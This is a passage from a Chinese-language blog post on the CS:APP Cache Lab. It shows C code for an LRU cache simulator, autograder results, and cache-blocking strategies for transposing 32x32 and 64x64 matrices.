class="hljs-keyword">switch</span> (opt)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;h&#x27;</span>:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,usage);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>:<br>            debug=<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>            s=atoi(optarg);<br>            S=<span class="hljs-number">1</span>&lt;&lt;s;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;E&#x27;</span>:<br>            E=atoi(optarg);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span>:<br>            b=atoi(optarg);<br>            <span class="hljs-comment">//B=1&lt;&lt;b;</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;t&#x27;</span>:<br>            trace_file=optarg;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//申请cache空间  cache是一个S*E个缓存行（每个缓存行包含一个块及有效位 标记位 )</span><br>    <span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">cache_line_</span>&#123;</span><br>        <span class="hljs-type">int</span> valid;   <span class="hljs-comment">//有效位</span><br>        <span class="hljs-type">__uint64_t</span> tag;   <span class="hljs-comment">//标记位</span><br>        <span class="hljs-type">int</span> last_access_time;  <span class="hljs-comment">//为了LRU设置的访问时间记录</span><br>    &#125;cache_line;<br><br>    cache_line *cache=(cache_line*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(cache_line)*S*E);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;S*E;i++)&#123;<br>        cache[i].valid=<span class="hljs-number">0</span>;<br>        cache[i].tag=<span class="hljs-number">0</span>;<br>        cache[i].last_access_time=<span class="hljs-number">0</span>;<br>    &#125;<br><br><br>    FILE *fp=fopen(trace_file,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-type">char</span> line_of_trace[MAX_SIZE];<br>    <span class="hljs-type">int</span> time_count=<span class="hljs-number">0</span>;  <span class="hljs-comment">//记录时间 每access一次内存 时间+1  时间越小 说明越久远</span><br>    <span class="hljs-comment">//逐行处理trace</span><br><br>    <span class="hljs-type">int</span> hit=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> miss=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> eviction=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(fgets(line_of_trace,MAX_SIZE,fp))&#123;<br>        <span class="hljs-comment">//分割每一行，提取address</span><br>        <span class="hljs-type">__uint64_t</span> address=<span class="hljs-number">0</span>;  <br>        <span class="hljs-comment">//int size=0;    </span><br>        <span class="hljs-type">int</span> access_count=<span class="hljs-number">0</span>;<br><br>        <span class="hljs-type">int</span> str_len=<span class="hljs-built_in">strlen</span>(line_of_trace);<br>        <span class="hljs-type">char</span> single_char;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;str_len<span class="hljs-number">-1</span>;i++)&#123;<br>            single_char=line_of_trace[i];<br>            <span class="hljs-keyword">if</span>(single_char==<span class="hljs-string">&#x27;I&#x27;</span>)<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(single_char==<span class="hljs-string">&#x27;L&#x27;</span>||single_char==<span class="hljs-string">&#x27;S&#x27;</span>)<br>                access_count=<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(single_char==<span class="hljs-string">&#x27;M&#x27;</span>)<br>                access_count=<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(single_char==<span class="hljs-string">&#x27; &#x27;</span>)<br>                <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(single_char==<span class="hljs-string">&#x27;,&#x27;</span>)&#123;<br>                <span class="hljs-comment">//size=line_of_trace[i+1]-&#x27;0&#x27;;</span><br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                address=address*<span class="hljs-number">16</span>+char2int(single_char);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(debug&amp;&amp;access_count!=<span class="hljs-number">0</span>) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,line_of_trace);<br><br>        <span class="hljs-keyword">if</span>(access_count==<span class="hljs-number">0</span>) <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-comment">//printf(&quot;access time:%d,adr:%d,size:%d\n&quot;,access_count,address,size);</span><br>    <br>        <span class="hljs-comment">//模拟内存访问 对于L，S只访问一次</span><br>        <span class="hljs-comment">//对于M,则访问两次，且不论第一次结果如何，第二次必然hit</span><br>        time_count++;   <span class="hljs-comment">//每次访问 时间递增</span><br>        <br>        <span class="hljs-comment">//计算标记位 组索引；</span><br>        <span class="hljs-type">int</span> m=<span class="hljs-number">64</span>;  <span class="hljs-comment">//地址64位</span><br>        <span class="hljs-type">__uint64_t</span> tag=address&gt;&gt;(s+b);   <span class="hljs-comment">//标记位</span><br>        <span class="hljs-type">__uint64_t</span> S_index=(address&lt;&lt;(m-s-b))&gt;&gt;(m-s);  <span class="hljs-comment">//组索引</span><br>        <span class="hljs-comment">//__uint64_t block_offset=(address&lt;&lt;(m-b))&gt;&gt;(m-b);   //块偏移</span><br>        <span class="hljs-comment">// printf(&quot;tag: %lx ,&quot;,tag);</span><br>        <span class="hljs-comment">// printf(&quot;S_index:%lx ,&quot;,S_index);</span><br>        <span class="hljs-comment">// printf(&quot;block_offset:%lx\n&quot;,block_offset);</span><br><br>        <span class="hljs-type">int</span> hit_flag=<span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> get_free_cache=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span>(access_count&gt;=<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-type">int</span> cache_idx_st=S_index*E;  <span class="hljs-comment">//cache的S_index组的起点偏移</span><br>            <span class="hljs-comment">//查询该组的缓存行</span><br>            <span class="hljs-comment">//查询是否hit</span><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;E;i++)&#123;   <br>                <span class="hljs-keyword">if</span>(cache[cache_idx_st+i].valid==<span class="hljs-number">1</span>&amp;&amp; \<br>                    cache[cache_idx_st+i].tag==tag)&#123;<br>                    hit++;<br>                    hit_flag=<span class="hljs-number">1</span>;<br>                    cache[cache_idx_st+i].last_access_time=time_count; <span class="hljs-comment">//记得更新时间</span><br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(hit_flag&amp;&amp;debug)  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; hit&quot;</span>);<br><br>            <span class="hljs-comment">//未hit 查询是否有空cache_line</span><br>            <span class="hljs-keyword">if</span>(!hit_flag)&#123;<br>                miss++;<br>                <span class="hljs-keyword">if</span>(debug) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; miss&quot;</span>);<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;E;i++)&#123;   <br>                <span class="hljs-keyword">if</span>(cache[cache_idx_st+i].valid==<span class="hljs-number">0</span>)&#123;<br>                    cache[cache_idx_st+i].valid=<span class="hljs-number">1</span>;<br>                    cache[cache_idx_st+i].tag=tag;<br>                    cache[cache_idx_st+i].last_access_time=time_count;<br>                    get_free_cache=<span class="hljs-number">1</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>           <br>            <span class="hljs-comment">//cache满了且miss </span><br>            <span class="hljs-keyword">if</span>(!get_free_cache&amp;&amp;!hit_flag)&#123;<br>                <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> evic_idx=<span class="hljs-number">0</span>,min_time_count=<span class="hljs-number">0xffffffff</span>;<br>                <span class="hljs-comment">//找出last_access_time最小了 即上次访问最久远的 将其替换</span><br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;E;i++)&#123;<br>                    <span class="hljs-keyword">if</span>(cache[cache_idx_st+i].last_access_time&lt;min_time_count)&#123;<br>                        min_time_count=cache[cache_idx_st+i].last_access_time;<br>                        evic_idx=i;<br>                    &#125;<br>                &#125;<br>                cache[cache_idx_st+evic_idx].tag=tag;<br>                cache[cache_idx_st+evic_idx].last_access_time=time_count;<br>                cache[cache_idx_st+evic_idx].valid=<span class="hljs-number">1</span>;<br>                eviction++;<br>                <span class="hljs-keyword">if</span>(debug) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; eviction&quot;</span>); <br>            &#125;<br><br>            <span class="hljs-keyword">if</span>(access_count==<span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-keyword">if</span>(debug) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; hit&quot;</span>);<br>                hit++;<br>                time_count++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(debug) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//printf(&quot;\nhit:%d,miss:%d,eviction:%d\n&quot;,hit,miss,eviction);</span><br>    printSummary(hit,miss,eviction);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">char2int</span><span class="hljs-params">(<span class="hljs-type">char</span> c)</span>&#123;<br>    <span class="hljs-keyword">if</span>(c&lt;=<span class="hljs-string">&#x27;9&#x27;</span>&amp;&amp;c&gt;=<span class="hljs-string">&#x27;0&#x27;</span>)<br>        <span class="hljs-keyword">return</span> c-<span class="hljs-string">&#x27;0&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(c&lt;=<span class="hljs-string">&#x27;f&#x27;</span>&amp;&amp;c&gt;=<span class="hljs-string">&#x27;a&#x27;</span>)<br>        <span class="hljs-keyword">return</span> c-<span class="hljs-string">&#x27;a&#x27;</span>+<span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>测试结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">                        Your simulator     Reference simulator<br>Points (s,E,b)    Hits  Misses  Evicts    Hits  Misses  Evicts<br>     3 (1,1,1)       9       8       6       9       8       6  traces/yi2.trace<br>     3 (4,2,4)       4       5       2       4       5       2  traces/yi.trace<br>     3 (2,1,4)       2       3       1       2       3       1  traces/dave.trace<br>     3 (2,1,3)     167      71      67     167      71      67  traces/trans.trace<br>     3 (2,2,3)     201      37      29     201      37      29  traces/trans.trace<br>     3 (2,4,3)     212      26      10     212      26      10  traces/trans.trace<br>     3 (5,1,5)     231       7       0     231       7       0  traces/trans.trace<br>     6 (5,1,5)  265189   21775   21743  265189   21775   21743  traces/long.trace<br>    27<br><br>TEST_CSIM_RESULTS=27<br></code></pre></td></tr></table></figure><h2 id="PART-B-优化矩阵转置"><a href="#PART-B-优化矩阵转置" class="headerlink" title="PART B 优化矩阵转置"></a>PART B 优化矩阵转置</h2><p>编写tran.c，使得cachde的miss越少越好。具体而言是编写函数transpose_submit</p><h4 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h4><p>Valgrind是一个GPL（一种开源协议）的软件，用于Linux（For x86, amd64 and ppc32）程序的内存调试和代码剖析。</p><p>需要下载好valgrind</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tap">使用下面的矩阵进行测试 ;<br>•<span class="hljs-number"> 32 </span>× 32:<span class="hljs-number"> 8 </span>points if m &lt; 300,<span class="hljs-number"> 0 </span>points if m &gt; 600<br>•<span class="hljs-number"> 64 </span>× 64:<span class="hljs-number"> 8 </span>points if m &lt; 1, 300,<span class="hljs-number"> 0 </span>points if m &gt; 2, 000<br>•<span class="hljs-number"> 61 </span>× 67:<span class="hljs-number"> 10 </span>points if m &lt; 2, 000,<span class="hljs-number"> 0 </span>points if m &gt; 3, 000<br>代码的测试过程是定义好的,<br>首先利用valgrind进行访问内存地址的跟踪，然后用csim-ref测试s=5,E=1,b=5时的miss情况;<br>cache共32组，每组32字节，可存放8个int<br></code></pre></td></tr></table></figure><ul><li><p>可以编写多个转置函数，只需要将其写入registerFunction函数中，测试时会自动对其测试</p></li><li><p>测试时会对于注册的第i个函数，会生成trace.fi文件，可利用csim-ref对该文件进行调试<br><code>linux&gt; ./csim-ref -v -s 5 -E 1 -b 5 -t trace.f0  </code></p></li><li><p>可参考<a href="http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf">http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf</a>  ，利用blocking技术降低miss</p></li></ul><h4 id="block技术"><a href="#block技术" class="headerlink" title="block技术"></a>block技术</h4><p>考虑下面的n*n矩阵乘法</p><p><img src="/project/./image/5,cache_lab_image/image-20240801161525637.png" alt="image-20240801161525637"></p><p>并考虑矩阵大小n较大的情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">bijk</span><span class="hljs-params">(<span class="hljs-built_in">array</span> A, <span class="hljs-built_in">array</span> B, <span class="hljs-built_in">array</span> C, <span class="hljs-type">int</span> n, <span class="hljs-type">int</span> bsize)</span><br>&#123;<br><span class="hljs-type">int</span> i, j, k, kk, jj;<br><span class="hljs-type">double</span> sum;<br><span class="hljs-type">int</span> en = bsize * (n/bsize); <span class="hljs-comment">/* Amount that fits evenly into blocks */</span><br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i++)<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; n; j++)<br>C[i][j] = <span class="hljs-number">0.0</span>;<br><br><span class="hljs-keyword">for</span> (kk = <span class="hljs-number">0</span>; kk &lt; en; kk += bsize) &#123;<br><span class="hljs-keyword">for</span> (jj = <span class="hljs-number">0</span>; jj &lt; en; jj += bsize) &#123;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123; <span class="hljs-comment">//对block进行计算</span><br><span class="hljs-keyword">for</span> (j = jj; j &lt; jj + bsize; j++) &#123;<br>sum = C[i][j];<br><span class="hljs-keyword">for</span> (k = kk; k &lt; kk + bsize; k++) &#123;<br>sum += A[i][k]*B[k][j];<br>&#125;<br>C[i][j] = sum;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其原理是矩阵乘法的分配律，<strong>将矩阵B分为块所在位置不为0，其余位置为0的矩阵</strong>(B1,B2,….)，那么计算时只需要计算不为0的位置。</p><p><img src="/project/./image/5,cache_lab_image/image-20240801161901703.png" alt="image-20240801161901703"></p><p>注意，block技术一般是用于编译优化，且代码不利于阅读，现在的cpu一般都有完善的预取硬件，因此分块并不会提高程序</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>cache32组，每组一行，每行32字节&#x3D;8int</p><h4 id="M-32，N-32"><a href="#M-32，N-32" class="headerlink" title="M&#x3D;32，N&#x3D;32"></a>M&#x3D;32，N&#x3D;32</h4><p><img src="/project/./image/5,cache_lab_image/image-20240801211058675.png" alt="image-20240801211058675"></p><p>首先想到，采用8*8分块，miss&#x3D;341。</p><p>问题在于对角线问题，易知M和N矩阵对角线映射到了cache的同一处，同时访问会驱逐内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">transpose_submit</span><span class="hljs-params">(<span class="hljs-type">int</span> M, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> A[N][M], <span class="hljs-type">int</span> B[M][N])</span><br>&#123;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> block_i=<span class="hljs-number">0</span>,block_j=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(M==<span class="hljs-number">32</span>&amp;&amp;N==<span class="hljs-number">32</span>)&#123;<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i+=<span class="hljs-number">8</span>) &#123;<br>            <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">32</span>; j+=<span class="hljs-number">8</span>) &#123;<br>                <span class="hljs-keyword">for</span>(block_i=i;block_i&lt;i+<span class="hljs-number">8</span>;block_i++)&#123;<br>                    <span class="hljs-keyword">for</span>(block_j=j;block_j&lt;j+<span class="hljs-number">8</span>;block_j++)&#123;<br>                        B[block_j][block_i]=A[block_i][block_j];<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;       <br>&#125;<br></code></pre></td></tr></table></figure><p>可以使用局部变量存储A的元素</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">transpose_submit</span><span class="hljs-params">(<span class="hljs-type">int</span> M, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> A[N][M], <span class="hljs-type">int</span> B[M][N])</span><br>&#123;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> block_i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(M==<span class="hljs-number">32</span>&amp;&amp;N==<span class="hljs-number">32</span>)&#123;<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i+=<span class="hljs-number">8</span>) &#123;<br>            <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">32</span>; j+=<span class="hljs-number">8</span>) &#123;<br>                <span class="hljs-keyword">for</span>(block_i=i;block_i&lt;i+<span class="hljs-number">8</span>;block_i++)&#123;<br>                    <span class="hljs-type">int</span> A0=A[block_i][j];<br>                    <span class="hljs-type">int</span> A1=A[block_i][j+<span class="hljs-number">1</span>];<br>                    <span class="hljs-type">int</span> A2=A[block_i][j+<span class="hljs-number">2</span>];<br>                    <span class="hljs-type">int</span> A3=A[block_i][j+<span class="hljs-number">3</span>];<br>                    <span class="hljs-type">int</span> A4=A[block_i][j+<span class="hljs-number">4</span>];<br>                    <span class="hljs-type">int</span> A5=A[block_i][j+<span class="hljs-number">5</span>];<br>                    <span class="hljs-type">int</span> A6=A[block_i][j+<span class="hljs-number">6</span>];<br>                    <span class="hljs-type">int</span> A7=A[block_i][j+<span class="hljs-number">7</span>];<br>                    B[j][block_i]=A0;<br>                    B[j+<span class="hljs-number">1</span>][block_i]=A1;<br>                    B[j+<span class="hljs-number">2</span>][block_i]=A2;<br>                    B[j+<span class="hljs-number">3</span>][block_i]=A3;<br>                    B[j+<span class="hljs-number">4</span>][block_i]=A4;<br>                    B[j+<span class="hljs-number">5</span>][block_i]=A5;<br>                    B[j+<span class="hljs-number">6</span>][block_i]=A6;<br>                    B[j+<span class="hljs-number">7</span>][block_i]=A7; <br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br><br>&#125;<br></code></pre></td></tr></table></figure><p>结果为miss&#x3D;287</p><h4 id="M-64-N-64"><a href="#M-64-N-64" class="headerlink" title="M&#x3D;64,N&#x3D;64"></a>M&#x3D;64,N&#x3D;64</h4><p>当M&#x3D;64,N&#x3D;64时，64*64&#x2F;32&#x2F;8&#x3D;16</p><p>cache只能存下一个矩阵的1&#x2F;16，即4行</p><p>每个矩阵的一个行，需要cache的8个组来存储</p><p>矩阵第一行，映射到0-7组；第二行映射到8-15组……</p><p>即，矩阵第i,j处，映射到了第( (i%4)*8 + j&#x2F;8 )组，矩阵各个元素所在cache的组如下图所示</p><p><img src="/project/./image/5,cache_lab_image/image-20240801213118072.png" alt="image-20240801213118072"></p><p><img src="/project/./image/5,cache_lab_image/image-20240801213956921.png" alt="image-20240801213956921"></p><p>矩阵A如何映射到矩阵B如何所示，黄色方框表示cache内存空间，采用8*8的block，并分为4个4 *4 的小块。</p><p><img src="/project/./image/5,cache_lab_image/image-20240812133413595.png" alt="image-20240812133413595"></p><p>直接采用8*8block不可行的原因是，矩阵A是按行访问的，矩阵B是按列访问的，则矩阵B从块1到块2时（即从前4行写到后4行时），块1还没利用完就被块2替换掉了，因此miss增多。</p><p>&#x3D;&#x3D;注意到，访问矩阵A的块3时，同时访问矩阵B的块3并不冲突。&#x3D;&#x3D;</p><p>可采用如下方法：</p><img src="./image/5,cache_lab_image/image-20240801220933510.png" alt="image-20240801220933510" style="zoom: 67%;" /><img src="./image/5,cache_lab_image/image-20240801220956507.png" alt="image-20240801220956507" style="zoom:67%;" /><img src="./image/5,cache_lab_image/image-20240801221004998.png" alt="image-20240801221004998" style="zoom:67%;" /><img src="./image/5,cache_lab_image/image-20240801221012804.png" alt="image-20240801221012804" style="zoom:67%;" /><img src="./image/5,cache_lab_image/image-20240801221023209.png" alt="image-20240801221023209" style="zoom: 67%;" /><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>;<br>      <span class="hljs-type">int</span> a_0, a_1, a_2, a_3, a_4, a_5, a_6, a_7;<br>      <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; i+=<span class="hljs-number">8</span>) &#123;<br>          <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">64</span>; j+=<span class="hljs-number">8</span>) &#123;<br>              <span class="hljs-comment">//步骤1</span><br>              <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = i; k &lt; i + <span class="hljs-number">4</span>; k++)&#123;<br>              <span class="hljs-comment">// 得到A的第1,2块</span><br>              a_0 = A[k][j + <span class="hljs-number">0</span>];<br>              a_1 = A[k][j + <span class="hljs-number">1</span>];<br>              a_2 = A[k][j + <span class="hljs-number">2</span>];<br>              a_3 = A[k][j + <span class="hljs-number">3</span>];<br>              a_4 = A[k][j + <span class="hljs-number">4</span>];<br>              a_5 = A[k][j + <span class="hljs-number">5</span>];<br>              a_6 = A[k][j + <span class="hljs-number">6</span>];<br>              a_7 = A[k][j + <span class="hljs-number">7</span>];<br>              <span class="hljs-comment">// 复制给B的第1,2块</span><br>              B[j + <span class="hljs-number">0</span>][k] = a_0;<br>              B[j + <span class="hljs-number">1</span>][k] = a_1;<br>              B[j + <span class="hljs-number">2</span>][k] = a_2;<br>              B[j + <span class="hljs-number">3</span>][k] = a_3;<br>              B[j + <span class="hljs-number">0</span>][k + <span class="hljs-number">4</span>] = a_4;<br>              B[j + <span class="hljs-number">1</span>][k + <span class="hljs-number">4</span>] = a_5;<br>              B[j + <span class="hljs-number">2</span>][k + <span class="hljs-number">4</span>] = a_6;<br>              B[j + <span class="hljs-number">3</span>][k + <span class="hljs-number">4</span>] = a_7;<br>              &#125;<br>              <span class="hljs-comment">//步骤2，3 逐行处理B右上角，按列处理A的左下角</span><br>              <span class="hljs-comment">//此处k表示A的列序号 即B的行序号</span><br>              <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = j; k &lt; j + <span class="hljs-number">4</span>; k++)&#123;<br>              <span class="hljs-comment">// 得到B的右上角块的每一行</span><br>              a_0 = B[k][i + <span class="hljs-number">4</span>];<br>              a_1 = B[k][i + <span class="hljs-number">5</span>];<br>              a_2 = B[k][i + <span class="hljs-number">6</span>];<br>              a_3 = B[k][i + <span class="hljs-number">7</span>];<br>              <span class="hljs-comment">// 得到A的左下角的每一列</span><br>              a_4 = A[i + <span class="hljs-number">4</span>][k];<br>              a_5 = A[i + <span class="hljs-number">5</span>][k];<br>              a_6 = A[i + <span class="hljs-number">6</span>][k];<br>              a_7 = A[i + <span class="hljs-number">7</span>][k];<br>              <span class="hljs-comment">// A的左下角列复制给B的右上角每一行</span><br>              B[k][i + <span class="hljs-number">4</span>] = a_4;<br>              B[k][i + <span class="hljs-number">5</span>] = a_5;<br>              B[k][i + <span class="hljs-number">6</span>] = a_6;<br>              B[k][i + <span class="hljs-number">7</span>] = a_7;<br>              <span class="hljs-comment">// B的左上角每一行赋值给B的左下角每一行</span><br>              B[k + <span class="hljs-number">4</span>][i + <span class="hljs-number">0</span>] = a_0;<br>              B[k + <span class="hljs-number">4</span>][i + <span class="hljs-number">1</span>] = a_1;<br>              B[k + <span class="hljs-number">4</span>][i + <span class="hljs-number">2</span>] = a_2;<br>              B[k + <span class="hljs-number">4</span>][i + <span class="hljs-number">3</span>] = a_3;<br>              &#125;<br>              <span class="hljs-comment">//步骤4 最后一小块的转置</span><br>              <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = i + <span class="hljs-number">4</span>; k &lt; i + <span class="hljs-number">8</span>; k++)&#123;<br>                  <span class="hljs-comment">// 处理第4块</span><br>                  a_4 = A[k][j + <span class="hljs-number">4</span>];<br>                  a_5 = A[k][j + <span class="hljs-number">5</span>];<br>                  a_6 = A[k][j + <span class="hljs-number">6</span>];<br>                  a_7 = A[k][j + <span class="hljs-number">7</span>];<br>                  B[j + <span class="hljs-number">4</span>][k] = a_4;<br>                  B[j + <span class="hljs-number">5</span>][k] = a_5;<br>                  B[j + <span class="hljs-number">6</span>][k] = a_6;<br>                  B[j + <span 